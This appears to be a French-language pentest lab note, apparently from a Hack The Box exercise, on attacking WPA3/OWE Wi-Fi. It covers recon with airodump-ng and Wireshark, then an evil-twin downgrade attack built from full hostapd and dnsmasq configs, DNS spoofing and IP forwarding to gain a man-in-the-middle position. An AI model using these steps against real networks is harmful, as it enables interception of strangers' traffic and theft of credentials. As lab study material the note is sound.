
[[#Recon]]
[[#Downgrade Attack (MiTM)]]

# Recon

1. Filtrer sur notre cible uniquement 

```shell
sudo airodump-ng -c <channel> --bssid <bssid> wlan0mon -w <output_file>
```


2. Attendre qu'un client se connecte (la PMF empêche la deauth donc obligé d'attendre) afin de capturer le handshake (celui ci n'est pas crackable)


3. Une fois le handshake capturé, vérifier sa validité avec cowpatty

```shell-session
cowpatty -c -r wpa3-01.cap
```

4. Ouvrir le fichier de capture avec Wireshark

```shell
sudo -E wireshark owe-01.cap
```

4. Filtrer sur la beacon frame

```
(wlan.fc.type == 0) && (wlan.fc.type_subtype == 0x08)
```

5. Dans `IEEE 802.11 Management → Tagged Parameters → RSN Information` -> `Auth Key Management` -> `RSN Capabilities` , verifier que la PMF est activée (Management Frame Protection Required = True). Si la PMF n'est pas activée, vulnérable à la deauth.

6. Identifier si le mode compatibilité est activé (Tag spécifique -> "Vendor Specific: Wi-Fi Alliance: OWE Transition Mode"). S'il est activé on peut faire une "Downgrade Attack"


# Downgrade Attack (MiTM)

> [!tIP]
> Consiste à créer un evil twin et forcer les clients à s'authentifier auprès de nous en WPA2 afin d'avoir un MiTM.


1. Créer le fichier de configuration open.conf suivant en remplaçant les bssid et ssid . Cela créer 2 points d'accès sur la même interface (requis en mode compatibilité)

```config
interface=wlan0
ssid=HTB-OWE
bssid=d8:d6:3d:eb:29:d5
channel=1
hw_mode=g
country_code=US
ignore_broadcast_ssid=1
ieee80211w=1
wpa=2
wpa_key_mgmt=OWE
rsn_pairwise=CCMP
owe_transition_ssid="HTB-Open"
owe_transition_bssid=fe:e1:de:ce:a5:ed

bss=wlan0_0
ssid=HTB-Open
bssid=fe:e1:de:ce:a5:ed
owe_transition_ssid="HTB-OWE"
owe_transition_bssid=d8:d6:3d:eb:29:d5
```

2. Configurer le DNS, DHCP et l'ip forwarding afin que le routage soit fonctionnel

dnsmasq.conf

```config
interface=wlan0
dhcp-range=10.0.0.100,10.0.0.254,255.255.255.0,24h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
server=8.8.4.4
listen-address=127.0.0.1
address=/#/10.0.0.1
log-dhcp
log-queries
```

lancer le service DNS avec le fichier conf

```shell
sudo dnsmasq -C dnsmasq.conf -d
```


Attribuer une IP valide à notre interface

```shell
sudo ifconfig wlan0 10.0.0.1/24
ifconfig wlan0

```


S'assurer que l'ip forwarding est bien activé afin de router le trafic vers internet

```shell-session
echo 1 > /proc/sys/net/ipv4/ip_forward
```


Faire en sorte que la victime soit toujours redirigée vers notre portail captif pour se connecter

```shell-session
sudo dnsspoof -i wlan0 
```


3. Lancer notre rogue AP

```shell-session
sudo hostapd open.conf
```


4. On est maintenant en position de MiTM, on peut lancer wireshark pour sniffer le trafic.

```
sudo -E wireshark MiTM.cap
```